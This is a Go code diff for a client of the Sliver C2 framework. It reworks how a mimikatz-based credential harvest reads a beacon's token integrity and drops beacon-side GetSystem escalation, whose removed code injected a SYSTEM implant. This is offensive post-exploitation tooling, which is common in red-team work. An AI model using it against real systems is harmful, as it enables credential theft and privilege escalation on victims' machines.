@@ -8,12 +8,12 @@ import (
 	"strings"
 	"time"
 
-	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"google.golang.org/protobuf/proto"
 )
 
-// This file lets the credential harvest work on a beacon.
+// This file lets the credential harvest reach a beacon.
 //
 // It would not, before. escalateForMimikatz asked for the session's token
 // integrity and gave up silently when that failed, and the failure was
@@ -52,119 +52,154 @@ func beaconRequest(beaconID string, timeout time.Duration) *commonpb.Request {
 
 // BeaconIntegrity reads a beacon's token integrity level.
 //
-// The response arrives asynchronously, so this polls the beacon's task list for
-// the GetPrivs result rather than expecting it inline -- the same shape as every
-// other beacon call here.
+// The correlation is by TaskID, and that is the whole correctness of this
+// function. Three earlier ways of identifying "the answer to my question" were
+// each wrong on a real beacon:
+//
+//	by Response on the task list   - the list RPC maps every row through
+//	                                 models.BeaconTask.ToProtobuf(false), which
+//	                                 omits Request and Response by design, so the
+//	                                 field is empty on every poll.
+//	by Description == "GetPrivs"   - the server sets Description to the protobuf
+//	                                 message name, so it is "GetPrivsReq".
+//	by "the newest completed task" - a heuristic, and one a second queued task or
+//	                                 a second operator can satisfy.
+//
+// GetPrivs answers with Response.TaskID, set by the server's asyncGenericHandler,
+// which is exactly the task this call queued. Using it removes the matching
+// question rather than answering it: a previous run's task has a different ID,
+// so a stale result is not something that can be picked up.
 func (c *Client) BeaconIntegrity(beaconID string, wait time.Duration) (string, error) {
 	ctx, cancel := context.WithTimeout(context.Background(), wait)
 	defer cancel()
 
-	if _, err := c.RPC.GetPrivs(ctx, &sliverpb.GetPrivsReq{
+	resp, err := c.RPC.GetPrivs(ctx, &sliverpb.GetPrivsReq{
 		Request: beaconRequest(beaconID, wait),
-	}); err != nil {
+	})
+	if err != nil {
 		return "", fmt.Errorf("queue GetPrivs for beacon: %w", err)
 	}
 
-	// Poll the task list for the completed GetPrivs task, which carries the
-	// integrity level in its response.
+	taskID := resp.GetResponse().GetTaskID()
+	if taskID == "" {
+		// No task to poll. Reporting a timeout here would misdescribe it: nothing
+		// was queued, so waiting would be pure delay.
+		return "", fmt.Errorf("the server queued GetPrivs for beacon %s but returned no task ID, "+
+			"so there is nothing to wait for", beaconID)
+	}
+
+	content, err := c.waitForBeaconTask(ctx, taskID, wait)
+	if err != nil {
+		return "", err
+	}
+	// The answer is a marshalled sliverpb.GetPrivs, not a bare string. Reading
+	// its ProcessIntegrity field is what makes the value usable: the raw bytes
+	// never equal "High", so treating them as text silently reports unelevated
+	// for a token that is elevated.
+	raw, err := beaconTaskResponseBytes(content)
+	if err != nil {
+		return "", err
+	}
+	privs := &sliverpb.GetPrivs{}
+	if err := proto.Unmarshal(raw, privs); err != nil {
+		return "", fmt.Errorf("the beacon answered GetPrivs but its response could not be read: %w", err)
+	}
+	// The implant reports its own failures here. A task that completed with an
+	// error still counts as COMPLETED server-side, so without this check the
+	// caller would read an empty integrity and conclude "not elevated" for a
+	// question the target answered with "I could not tell you".
+	if errMsg := strings.TrimSpace(privs.GetResponse().GetErr()); errMsg != "" {
+		return "", fmt.Errorf("the beacon could not read its token: %s", errMsg)
+	}
+	return strings.TrimSpace(privs.ProcessIntegrity), nil
+}
+
+// waitForBeaconTask polls one task until it completes and returns its content.
+//
+// Polling a known ID, rather than scanning a list for something that looks
+// right, is what makes another caller's task impossible to mistake for this one.
+func (c *Client) waitForBeaconTask(ctx context.Context, taskID string, wait time.Duration) (*BeaconTaskView, error) {
 	deadline := time.Now().Add(wait)
 	for time.Now().Before(deadline) {
 		select {
 		case <-ctx.Done():
-			return "", fmt.Errorf("beacon did not answer GetPrivs within %s", wait)
+			return nil, fmt.Errorf("the beacon did not answer within %s", wait)
 		case <-time.After(beaconPollInterval):
 		}
 
-		tasks, err := c.BeaconTasks(beaconID)
+		content, err := c.BeaconTaskContent(taskID)
 		if err != nil {
+			// A transient read failure is not the answer; the beacon may still be
+			// working. Only the deadline is conclusive.
 			continue
 		}
-		for _, t := range tasks {
-			if !strings.EqualFold(t.Description, "GetPrivs") && !strings.EqualFold(t.Description, "GetPrivs") {
-				continue
-			}
-			if level := integrityFromTask(t); level != "" {
-				return level, nil
-			}
+		if !strings.EqualFold(content.State, "completed") {
+			continue
 		}
+		// The caller decodes the payload and reads the implant's error from the
+		// typed wrapper. Doing it here would mean parsing the bytes without
+		// knowing which message they are, and a protobuf field number means
+		// different things in different messages -- field 1 of GetPrivs is the
+		// embedded Response, while field 1 of Response is the error string, so a
+		// wrong guess silently reads the wrong field.
+		return content, nil
 	}
-	return "", fmt.Errorf("beacon did not answer GetPrivs within %s", wait)
+	return nil, fmt.Errorf("the beacon did not answer within %s", wait)
 }
 
-// integrityFromTask pulls the integrity level out of a completed GetPrivs task.
+// beaconTaskResponseBytes returns a task's raw response payload.
 //
-// A task that has not completed carries no response, which is why this reports
-// "" rather than an error: the caller is polling and "not yet" is the normal
-// case. A failed task carries a state that is not "completed", so it falls
-// through to the same answer and the caller keeps waiting until its deadline --
-// at which point the timeout message names the wait, which is the useful thing
-// to report either way.
-func integrityFromTask(t BeaconTaskView) string {
-	if !strings.EqualFold(t.State, "completed") || t.ResponseB64 == "" {
-		return ""
+// The view carries it base64-encoded because the console serves these as JSON,
+// so the decode is the caller's step. Every consumer needs the decoded bytes:
+// the response is a marshalled protobuf, and a protobuf cannot be parsed from
+// its base64 text.
+func beaconTaskResponseBytes(v *BeaconTaskView) ([]byte, error) {
+	if v == nil || v.ResponseB64 == "" {
+		return nil, nil
 	}
-	decoded, err := base64.StdEncoding.DecodeString(t.ResponseB64)
+	raw, err := base64.StdEncoding.DecodeString(v.ResponseB64)
 	if err != nil {
-		return ""
+		return nil, fmt.Errorf("the beacon's response was not valid base64: %w", err)
 	}
-	return strings.TrimSpace(string(decoded))
+	return raw, nil
 }
 
-// beaconPollInterval is how often the async helpers re-read a beacon's task
-// list while waiting for an answer.
+// beaconPollInterval is how often the async helpers re-read a task.
 const beaconPollInterval = 2 * time.Second
 
-// BeaconElevateToSystem runs GetSystem against a beacon and waits for the SYSTEM
-// session it produces.
+// errBeaconElevationUnsupported explains why beacon-to-SYSTEM escalation is not
+// attempted.
 //
-// GetSystem does not elevate the beacon's own token. It generates a second
-// implant and injects it into a SYSTEM-owned process, so what comes back is a
-// NEW interactive session -- which is why this waits on the session list rather
-// than on the beacon.
-func (c *Client) BeaconElevateToSystem(beaconID, hostingProcess string, wait time.Duration) (string, error) {
-	before, err := c.Sessions()
-	if err != nil {
-		return "", fmt.Errorf("cannot snapshot sessions before escalating: %w", err)
-	}
-	seen := make(map[string]bool, len(before))
-	for _, s := range before {
-		seen[s.ID] = true
-	}
+// This is a server-side limitation, not a gap in this client, and it is worth
+// stating precisely because the symptom otherwise looks like a client bug.
+// GetSystem reads its target with
+//
+//	session := core.Sessions.Get(req.Request.SessionID)
+//
+// unconditionally -- there is no async/beacon branch. GetPrivs, by contrast,
+// routes through GenericHandler and only touches the session table when
+// req.Request.Async is false. So a request carrying a BeaconID and no SessionID
+// is answered with ErrInvalidSessionID ("Invalid session ID"), every time.
+// asyncGenericHandler is never reached for GetSystem.
+//
+// Rather than spend the operator's wait on a call that cannot succeed, the
+// harvest reports the situation and the way out. The message names the remedy,
+// because "unsupported" on its own is not actionable.
+var errBeaconElevationUnsupported = errors.New(
+	"a beacon's token cannot be escalated to SYSTEM: the server's GetSystem accepts only an " +
+		"interactive session and has no beacon path. Convert the beacon to a session (the " +
+		"console's beacon view has that action) and run the harvest there, or run getsystem " +
+		"on an existing session and harvest against it")
 
-	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
-	defer cancel()
-	if _, err := c.RPC.GetSystem(ctx, &clientpb.GetSystemReq{
-		HostingProcess: hostingProcess,
-		// The SYSTEM implant has to call home, and it does so over the HTTP C2
-		// profile named here. An installation that has never used one still has
-		// the default, which is why this name is hardcoded rather than exposed:
-		// there is nothing for the operator to choose.
-		Config:  &clientpb.ImplantConfig{HTTPC2ConfigName: defaultHTTPC2Profile},
-		Request: beaconRequest(beaconID, 60*time.Second),
-	}); err != nil {
-		return "", fmt.Errorf("queue GetSystem for beacon: %w", err)
-	}
-
-	deadline := time.Now().Add(wait)
-	for time.Now().Before(deadline) {
-		time.Sleep(elevationPollInterval)
-		sessions, err := c.Sessions()
-		if err != nil {
-			continue
-		}
-		for _, s := range sessions {
-			if !seen[s.ID] && !s.IsDead {
-				return s.ID, nil
-			}
-		}
-	}
-	return "", fmt.Errorf("GetSystem was queued but no SYSTEM session appeared within %s "+
-		"(a beacon only runs it on its next check-in; a long sleep interval delays it)", wait)
+// BeaconElevateToSystem reports that beacon-side escalation is unavailable.
+//
+// It keeps its signature so callers do not have to special-case the beacon, and
+// so the reason reaches the operator through the same channel as every other
+// escalation failure. It does not attempt the RPC: a call that is certain to be
+// refused, after a wait, teaches the operator less than the sentence below.
+func (c *Client) BeaconElevateToSystem(_, _ string, _ time.Duration) (string, error) {
+	return "", errBeaconElevationUnsupported
 }
-
-// defaultHTTPC2Profile is the HTTP C2 profile name Sliver ships and the one
-// GetSystem builds its implant from.
-const defaultHTTPC2Profile = "default"
 
 // errNoIntegritySource is returned when neither a session nor a beacon ID was
 // supplied, which means the caller lost the target rather than that the target
